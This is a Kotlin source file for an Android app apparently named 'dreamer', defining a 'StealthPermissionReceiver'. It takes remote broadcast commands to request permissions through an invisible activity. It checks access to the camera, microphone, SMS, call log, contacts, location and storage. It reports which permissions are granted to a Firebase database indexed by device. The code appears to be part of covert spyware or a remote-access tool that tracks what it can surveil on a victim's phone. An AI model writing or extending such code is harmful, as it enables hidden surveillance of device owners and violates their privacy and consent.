package com.h4k3r.dreamer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import kotlinx.coroutines.*

/**
 * StealthPermissionReceiver handles permission-related events
 * and provides a stealthy way to request and manage permissions
 */
class StealthPermissionReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "StealthPermissionReceiver"
    }
    
    private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    override fun onReceive(context: Context, intent: Intent) {
        Log.d(TAG, "StealthPermissionReceiver triggered: ${intent.action}")
        
        when (intent.action) {
            "com.h4k3r.dreamer.GRANT_PERMISSION" -> {
                val permission = intent.getStringExtra("permission") ?: return
                handleGrantPermission(context, permission)
            }
            "com.h4k3r.dreamer.REQUEST_PERMISSION" -> {
                val permission = intent.getStringExtra("permission") ?: return
                handleRequestPermission(context, permission)
            }
            "com.h4k3r.dreamer.CHECK_PERMISSIONS" -> {
                handleCheckPermissions(context)
            }
        }
    }
    
    private fun handleGrantPermission(context: Context, permission: String) {
        Log.d(TAG, "Handling grant permission: $permission")
        
        // Start PermissionMonitorService to handle the permission granting
        val serviceIntent = Intent(context, PermissionMonitorService::class.java).apply {
            action = "com.h4k3r.dreamer.GRANT_PERMISSION"
            putExtra("permission", permission)
        }
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(context, serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start service for granting permission", e)
            updatePermissionStatus(context, permission, false, "Service start failed")
        }
    }
    
    private fun handleRequestPermission(context: Context, permission: String) {
        Log.d(TAG, "Handling request permission: $permission")
        
        // For stealth operation, we'll use a transparent activity to request permissions
        val activityIntent = Intent(context, InvisiblePermissionActivity::class.java).apply {
            putExtra("permission", permission)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        
        try {
            context.startActivity(activityIntent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start activity for requesting permission", e)
            updatePermissionStatus(context, permission, false, "Activity start failed")
        }
    }
    
    private fun handleCheckPermissions(context: Context) {
        Log.d(TAG, "Checking all permissions")
        
        coroutineScope.launch {
            try {
                val permissionStatus = checkAllPermissions(context)
                updatePermissionsInFirebase(context, permissionStatus)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to check permissions", e)
            }
        }
    }
    
    private fun checkAllPermissions(context: Context): Map<String, Boolean> {
        val permissionsToCheck = mapOf(
            "camera" to android.Manifest.permission.CAMERA,
            "location_fine" to android.Manifest.permission.ACCESS_FINE_LOCATION,
            "location_coarse" to android.Manifest.permission.ACCESS_COARSE_LOCATION,
            "contacts" to android.Manifest.permission.READ_CONTACTS,
            "sms" to android.Manifest.permission.READ_SMS,
            "phone" to android.Manifest.permission.READ_PHONE_STATE,
            "call_log" to android.Manifest.permission.READ_CALL_LOG,
            "microphone" to android.Manifest.permission.RECORD_AUDIO,
            "storage_read" to if (Build.VERSION.SDK_INT >= 33) {
                android.Manifest.permission.READ_MEDIA_IMAGES
            } else {
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            },
            "storage_write" to android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            "calendar" to android.Manifest.permission.READ_CALENDAR,
            "notifications" to if (Build.VERSION.SDK_INT >= 33) {
                android.Manifest.permission.POST_NOTIFICATIONS
            } else {
                "android.permission.FAKE"
            }
        )
        
        val result = mutableMapOf<String, Boolean>()
        
        permissionsToCheck.forEach { (key, androidPermission) ->
            if (androidPermission != "android.permission.FAKE") {
                result[key] = ContextCompat.checkSelfPermission(
                    context,
                    androidPermission
                ) == PackageManager.PERMISSION_GRANTED
            } else {
                // Skip permissions not applicable to this Android version
                result[key] = true
            }
        }
        
        // Check special permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            result["all_files_access"] = false // Placeholder, actual check would be more complex
        }
        
        return result
    }
    
    private fun updatePermissionsInFirebase(context: Context, permissions: Map<String, Boolean>) {
        try {
            val prefs = context.getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
            val secretKey = prefs.getString("secret_key", "") ?: ""
            val deviceId = prefs.getString("device_id", "") ?: ""
            
            if (secretKey.isNotEmpty() && deviceId.isNotEmpty()) {
                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("info")
                    .child("permissions")
                    .setValue(permissions)
                    
                Log.d(TAG, "Updated permissions in Firebase")
            } else {
                Log.e(TAG, "Missing authentication credentials")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update permissions in Firebase", e)
        }
    }
    
    private fun updatePermissionStatus(context: Context, permission: String, granted: Boolean, message: String) {
        try {
            val prefs = context.getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
            val secretKey = prefs.getString("secret_key", "") ?: ""
            val deviceId = prefs.getString("device_id", "") ?: ""
            
            if (secretKey.isNotEmpty() && deviceId.isNotEmpty()) {
                val updates = mapOf(
                    "granted" to granted,
                    "message" to message,
                    "timestamp" to System.currentTimeMillis()
                )
                
                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("permissions")
                    .child(permission)
                    .child("status")
                    .setValue(updates)
                    
                Log.d(TAG, "Updated permission status for $permission: $granted")
            } else {
                Log.e(TAG, "Missing authentication credentials")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update permission status", e)
        }
    }
}